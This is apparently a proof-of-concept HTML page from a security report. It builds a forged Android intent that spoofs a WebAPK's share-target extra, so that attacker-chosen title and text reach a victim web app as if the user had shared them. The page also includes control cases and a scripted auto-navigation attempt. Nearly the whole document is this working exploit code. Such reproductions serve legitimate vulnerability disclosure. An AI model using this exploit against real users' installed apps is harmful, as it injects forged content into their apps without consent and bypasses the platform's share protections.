<!doctype html>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WebAPK intent carrier</title>
<style>
  body { font: 18px system-ui, sans-serif; max-width: 46rem; margin: 3rem auto; padding: 0 1rem; }
  a, button { display: block; margin: 1rem 0; padding: 1rem; font-size: 1rem; }
  pre { white-space: pre-wrap; overflow-wrap: anywhere; background: #eee; padding: 1rem; }
</style>
<h1>WebAPK intent carrier</h1>
<p>This page is an unrelated HTTPS origin. It constructs an Android intent only from the supplied controlled victim host and installed WebAPK package.</p>
<a id="trigger">Launch forged ACTION_VIEW intent</a>
<a id="no-reserved-extra">Control: ACTION_VIEW without reserved share extra</a>
<button id="ordinary-post" type="button">Control: ordinary cross-site POST</button>
<button id="scripted" type="button">Attempt scripted navigation after two seconds</button>
<pre id="state">LOADING</pre>
<script>
  const params = new URLSearchParams(location.search);
  const victim = params.get('victim') || '';
  const packageName = params.get('package') || '';
  // Google Play-generated WebAPKs bind the share alias to the package name.
  // It is visible in the installed package manifest and is not a secret.
  const shareClass = `org.chromium.webapk.shell_apk.ShareActivity.${packageName}`;
  const selectedExtra = 'org.chromium.webapk.selected_share_target_activity_class_name';
  const intent = `intent://${victim}/in-scope#Intent;scheme=https;action=android.intent.action.VIEW;package=${packageName};S.${selectedExtra}=${shareClass};S.android.intent.extra.SUBJECT=forged-title;S.android.intent.extra.TEXT=FORGED_SHARE_BODY_7f31;end`;
  const noReservedExtraIntent = `intent://${victim}/in-scope#Intent;scheme=https;action=android.intent.action.VIEW;package=${packageName};end`;
  const trigger = document.querySelector('#trigger');
  const state = document.querySelector('#state');
  trigger.href = intent;
  document.querySelector('#no-reserved-extra').href = noReservedExtraIntent;
  document.querySelector('#ordinary-post').addEventListener('click', () => {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = `https://${victim}/share`;
    for (const [name, value] of [
      ['title', 'ordinary-cross-site-control'],
      ['text', 'ORDINARY_POST_CONTROL_19d4'],
    ]) {
      const input = document.createElement('input');
      input.type = 'hidden';
      input.name = name;
      input.value = value;
      form.append(input);
    }
    document.body.append(form);
    form.submit();
  });
  state.textContent = `victim=${victim}\npackage=${packageName}\nshareClass=${shareClass}\n${intent}`;
  document.querySelector('#scripted').addEventListener('click', () => {
    state.textContent += '\nSCRIPTED_NAVIGATION_ARMED';
    setTimeout(() => { location.href = intent; }, 2000);
  });
</script>
